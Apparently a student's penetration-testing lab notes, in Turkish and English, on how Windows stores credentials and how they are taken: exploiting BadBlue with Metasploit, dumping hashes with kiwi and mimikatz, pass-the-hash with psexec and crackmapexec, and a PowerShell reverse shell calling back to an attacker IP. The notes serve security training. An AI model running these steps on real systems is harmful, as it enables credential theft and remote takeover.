● The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database. #SAM 

● <span style="background:#d4b106">Hashing is the process of converting a piece of data into another value.</span> 

● Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
#LSA 
### ● Windows versions up to Windows Server 2003 utilize two different types of hashes:
## + LM
## + NTLM

<span style="background:#d4b106">• Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.</span>
#ntlm #NTLM-hash #windows-hash 

---

## SAM Database
#sam-database
#SAM 

● <span style="background:#d4b106">SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows.</span> 
<span style="background:#40a9ff">All user account passwords stored in the SAM database are hashed.</span> BY Default all usernames and passwords are hashed.

#### ● <span style="background:#ff4d4f">The SAM database file cannot be copied while the operating system is running.</span>
● <span style="background:#ff4d4f">The Windows NT kernel keeps the SAM database file locked</span> and 

##### <span style="background:#d4b106">as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes</span>
<span style="background:#d4b106">from the</span> <span style="background:#ff4d4f">LSASS process.</span> #lsass 

### LSASS windows'un authentication'undan sorumludur. Kendisinde bir cache memory bulunur. Ve tipik olarak SAM ile etkileşime geçtikçe windows hash'leri içerir bulundurur.

## mimikatz gibi tool'lar lsass process ile etkileşime geçer ve bu cache memory'den hash'leri dump etmeye çalışır.



● In modern versions of Windows, the SAM database is encrypted with a syskey. #syskey

---
## Syskey Nedir? #syskey 
**Syskey**, Güvenlik Hesap Yöneticisi (SAM) veritabanını korumak için kullanılan bir Windows özelliğidir. SAM, kullanıcı hesapları ve parolaları gibi önemli güvenlik bilgilerini içeren bir dosyadır. Syskey, SAM veritabanını 128 bitlik bir RC4 anahtarı kullanarak şifreler, bu da veritabanına yetkisiz erişimi zorlaştırır.

---

>[!warning] Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
### Bu şu demek direk standart kullanıcı'dan elde edilmiş bir session ile bu hash'leri alamazsın. Yetki yükseltme gerektirir.

---

## LSASS İşlemi Nedir?

**LSASS**, Yerel Güvenlik Yetkilisi Alt Sistem Hizmeti (**Local Security Authority Subsystem Service**) anlamına gelir. Bu, Windows işletim sistemlerinde kritik bir sistem işlemidir ve aşağıdakiler de dahil olmak üzere birçok önemli güvenlik işlevinden sorumludur:

- **Kullanıcı kimlik doğrulama:** Kullanıcıların bir Windows bilgisayarına veya sunucusuna oturum açmasını doğrular.
- **Parola yönetimi:** Kullanıcıların parolalarını depolar ve değiştirir.
- **Erişim belirteçleri:** Kullanıcılara ve uygulamalara sistem kaynaklarına erişim izni veren jetonlar oluşturur.
- **Güvenlik ilkeleri:** Güvenlik duvarı ayarları ve hesap kilitlenme politikaları gibi sistem güvenlik ilkelerini uygular.
- **Hesap yönetimi:** Kullanıcı hesaplarını ve gruplarını oluşturur, yönetir ve siler.

---

## LM (LanMan)
#LM #LanMan 
![[Pasted image 20240207113003.png]]
![[Pasted image 20240207113014.png]]

---

## NTLM (NTHash)
#NTLM #NTHash

### LM windows tarafından iptal edildiğin için çok çok çok yuksek ihtimal biz NTLM veya NT hash'lerla karşılaşacağız.
##### Ayrıca NTLM'in de kendi içinde versiyonları vardır. NTLMv1  NTLMv2 

● NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers.<span style="background:#fff88f"> The authentication process involves using a valid username and password to authenticate successfully.</span>

● From Windows Vista onwards, <span style="background:#ff4d4f">Windows disables LM hashing</span> and <span style="background:#d4b106">utilizes NTLM hashing.</span>

● When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
● NTLM improves upon LM in the following ways:
+ Does not split the hash in to two chunks.
+ Case sensitive.
<span style="background:#fff88f">+ Allows the use of symbols and unicode characters.</span>
![[Pasted image 20240207113428.png]]


---

# Windows Configuration Files
#windows-configuration
Windows, bir dizi tekrarlayan görevi otomatikleştirebilir, örneğin birçok sistemde Windows'un toplu dağıtımını veya kurulumunu. 
● Bu genellikle Unattended Windows Setup yardımcı programı kullanılarak yapılır, bu program Windows'un sistemlere toplu kurulumunu/dağıtımını otomatikleştirmek için kullanılır. 
<span style="background:#d4b106">● Bu araç, belirli yapılandırmaları ve kullanıcı hesap kimlik bilgilerini içeren yapılandırma dosyalarını kullanır, özellikle Administrator hesabının şifresini içerir.</span> 

### ● <span style="background:#d4b106">Unattended Windows Setup yapılandırma dosyaları, kurulumdan sonra hedef sistemde bırakılırsa</span>, saldırganların Windows hedefine yasal olarak kimlik doğrulaması yapmak için kullanabileceği kullanıcı hesap kimlik bilgilerini ortaya çıkarabilir.


## Unattended Windows Setup
#Unattended-Windows-Setup

The Unattended Windows Setup utility will typically utilize one of the following configuration files <font color="#ffff00">that contain user account and system configuration information:</font>
##### <span style="background:#d4b106">○ C:\Windows\Panther\Unattend.xml</span>
##### <span style="background:#d4b106">○ C:\Windows\Panther\Autounattend.xml</span>

As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

----
## Mimikatz - Kiwi
#mimikatz #kiwi

● Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). <span style="background:#d4b106">It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.</span>
● The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.

<span style="background:#d4b106">● Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.</span>
● We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

Note: Mimikatz will require elevated privileges in order to run correctly.

### Çok Önemli NOT
![[Pasted image 20240207124811.png]]
## /usr/share/windows-resources/
### Kali'de böyle bir klasör var ve bunun içinde windows üzerine kullanılabilecek Tool'lar yerleştirilmiş. Tek Tek Youtube'dan nasıl kullanıldığına bakılabilir.

---

## Exploit
![[Pasted image 20240207125338.png]]

### Dersteki Makine'deki zaafiyet
#badblue
### BadBlue httpd 2.7

```
searchsploit badblue 2.7
```
![[Pasted image 20240207125539.png]]
```
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.27.166
exploit
```

![[Pasted image 20240207125623.png]]
## getuid
## sysinfo
![[Pasted image 20240207131518.png]]




---
### Shell Geldi Buradan sonra kendi makinemizde Metasploitable 3 Windows'tan devam edeceğiz.

## Migrate işlemini lsass.exe'ye yapmamız gerekiyor.

## ![[Pasted image 20240207125831.png]]
## migrate -N lsass.exe
##### Bu sefer pid numarası ile değil de isimle migrate yaptık.

## Çok Önemli Not
### Eğer sistem bize NT Authority 'nin yürüttüğü bir işleme migrate yapmamıza izin veriyorsa bizim yetkimiz meterpreter shell 'de yukseliyor
![[Pasted image 20240207132031.png]]

### load kiwi 
![[Pasted image 20240207130238.png]]
### kiwi'yi yukledik


## creds_all 
![[Pasted image 20240207130344.png]]
>[!warning] Eğer meterpreter komutları aklına gelmezse load kiwi load incognito dedikten sonra help'e basarsan bütün yapılabilecek komutları sıralar meterpreter sana
## meterpreter>help
## kiwi commands
#kiwi-commands
![[Pasted image 20240207130946.png]]
## Active Directory Environment de çalışıyorsanız 
### golden ticket
### kerberos ticket
## komutları işe yarar

---

## lsa_dump_sam
#### Bu komut çok önemli
![[Pasted image 20240207130628.png]]
### Bizim windows'ta şifreler SAM database'de toplanıyordu. Buradaki bütün hash'leri alır.
![[Pasted image 20240207130726.png]]

## lsa_dump_secrets
### SAM'i koruyan syskey hash'lerini de aldık
#### Bu komut bazen bize clear text credential verdiği de oluyor.
![[Pasted image 20240207130905.png]]

---

![[Pasted image 20240207132723.png]]
## password_change komutuyla user'ların hash veya password'lerini değiştirebilirsin

#### Pentest yaparken bu tavsiye edilmez. Çünkü Şuan orada bir iş yürüyor.

---

### Peki HASH'ler neden bu kadar önemli ?
##### Çünkü hash'leri kırmak eğer parola güçlüyse aylar yıllar alabilir. 
## Pass the hashes attack var bunda kullanılabilir.

---

## Şimdi SIRA MIMIKATZ
#mimikatz 
![[Pasted image 20240207133139.png]]

```
meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

![[Pasted image 20240207133505.png]]

## Mimikatz.exe 'yi upload ile karşı tarafın Temp klasörüne yükledik.

---

## meterpreter> shell 
komutuyla Normal CMD shell'e geçtik.

```
.\mimikatz.exe 

```
### Bu komutla çalıştırdık mimikatz'i
### mimikatz # 
##### Bu şekilde mimikatz shell'e donustu
## İlk yapılması gereken yetkimiz var mı bunu kontrol etmek

### privilege::debug 
```
privilege::debug 
```
![[Pasted image 20240207134040.png]]
### Yetkimiz var

## lsadump::sam 
![[Pasted image 20240207134201.png]]
##### Bu ayrıca kiwi'den daha fazla info veriyor.

### Burada şuna dikkat kesilelim RID (500) tam anlamıyla administrator demek. En yetkili kullanıcı
#rid #RID 


## lsadump::secrets 
![[Pasted image 20240207134542.png]]
## Burada Clear text passwords görebilirsin.

---

#mimikatz 
#mimikatz-log-on-passwords
## Mimikatz'in güzel bir özelliği de LOG-On passwords'leri görebiliyorsun

#### Eğer sen windows sisteme giriş yaparken senin giriş şifren clear text olarak depolanıyorsa bunu direk mimikatz bize verir.


## sekurlsa::logonpasswords
```
sekurlsa::logonpasswords
```
![[Pasted image 20240207135147.png]]
![[Pasted image 20240207135207.png]]
![[Pasted image 20240207135226.png]]
![[Pasted image 20240207135247.png]]

### Bu sistemde girilen bazı clear text password'ler disabled yapılmamış o yüzden direk görebiliyorum.
![[Pasted image 20240207140433.png]]


----

## Pass-The-Hash Attacks
![[Pasted image 20240207211339.png]]

#Pass-The-Hash Attacks

+ Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
+ We can use multiple tools to facilitate a 
Pass-The-Hash attack:

### + Metasploit #PsExec module
### + #Crackmapexec

##### + This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

### Bu teknikte elimize geçen hash'leri #SMB yoluyla hedef sisteme erişim için kullanacağız.


 


---
## Şimdi kendimize şu soruyu soralım ---> Zaten NT Authority System olarak yetkimi en üste çıkarmışım. Neden daha credetials peşinde veya hash'ler peşinde koşuyorum.

### Cevep şu exploit ettiğin vulnerability 
##### 1. yuklenen bir patch ile yamanırsa, veya 
##### 2.bir hardenning yapılıp erişim sağladığın zaafiyet disabled olursa yada
##### 3. Firewall rule değiştirilip erişimin engellenirse
###  nasıl tekrar tekrar erişim Sağlayacaksın.
##### Ayrıca legitimate bir credentials ile sisteme erişim sağlayınca yakalanma tespit edilme ihtimalin çok düşüktür.

## Elinde credentials olabilecek cleartext bir password veya Pass-The-Hash yapabileceğin bir hash varsa bu güvenlik tedbirlerine rağmen bağlanırsın.

---

## Exploit
### Bir önceki Metasploitable 3 Windows ile devam edeceğiz.

## Mimikatz çıktılarını Metasploitable 3 klasörü içine koydum.

---
## hashdump
Administrator: 500:<span style="background:#d4b106">aad3b435b51404eeaad3b435b51404ee</span>:<span style="background:#ff4d4f">e02bc503339d51f71d913c245d35b50b</span>:::

### Burada 500 RID 'dir ve en yetkili kulanıcıyı gösterir.
### Serı renkli olan hash LM hash'tir Zaten her user için de aynıdır.
#### Kırmızı renkli olan ise bizi ilgilenndiren NTLM hashtir.

![[Pasted image 20240207220855.png]]

### e02bc503339d51f71d913c245d35b50b
## Bu hash'i özellikle kaydediyoruz. 

### <span style="background:#ff4d4f">Metasploit PsExec Module LM hash ve NTLM hash'leri belirtmemizi istiyor.</span>

---
## Şimdi CTRL+Z ile veya backgound komutuyla session'u gerş alıyoruz. Yeni modul için


### msf6 > search psexec
![[Pasted image 20240207221414.png]]
##  5   exploit/windows/smb/psexec
### use 5
![[Pasted image 20240207222940.png]]
### SMBuser : Administrator
### SmbPass: LM+NTLM HASH
aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

---
## Pass-The-Hash Başarılı
![[Pasted image 20240207223250.png]]
>[!warning] Run dedik shell alamadık exploit dedik alamadık. 1 denemede başarısız olunca hemen bırakma. Girdiğin verileri kontrol et bir daha dene. Bu shell'i 2nci de aldık örneğin

---

#crackmapexec 
#crackmapexec-smb
## Crackmapexec SMB ile erişim sağlayacağız.

```
crackmapexec smb 10.0.2.17 -u Administrator -p "e02bc503339d51f71d913c245d35b50b"
```
```
crackmapexec smb 10.0.2.17 -u Administrator -H "e02bc503339d51f71d913c245d35b50b"
```
>[!bug] Yanlışlıkla hash -H optionu yazacağımıza -p password verince başarısız oldu başlangıçta attack
>
![[Pasted image 20240207224313.png]]


### Şimdi bu şu demek -x "ipconfig" yazarsam direk komutları çalıştırır.
![[Pasted image 20240207224703.png]]
![[Pasted image 20240207233144.png]]
![[Pasted image 20240207233202.png]]

```
crackmapexec smb -d . -u Administrator -p 'pass123' -X "$c = New-Object System.Net.Sockets.TCPClient('192.168.204.190',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()" 192.168.204.183

```

```
crackmapexec smb -d . -u Administrator -H "e02bc503339d51f71d913c245d35b50b" -X "$c = New-Object System.Net.Sockets.TCPClient('10.0.2.4',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()" 192.168.204.183
```

https://www.infosecmatter.com/rce-on-windows-from-linux-part-2-crackmapexec/
### Denedik Başaramadık ancak bu denenebilir farklı sistemlerde.

## -x   ile -X arasındaki farka dikkat
---
---
---
---





















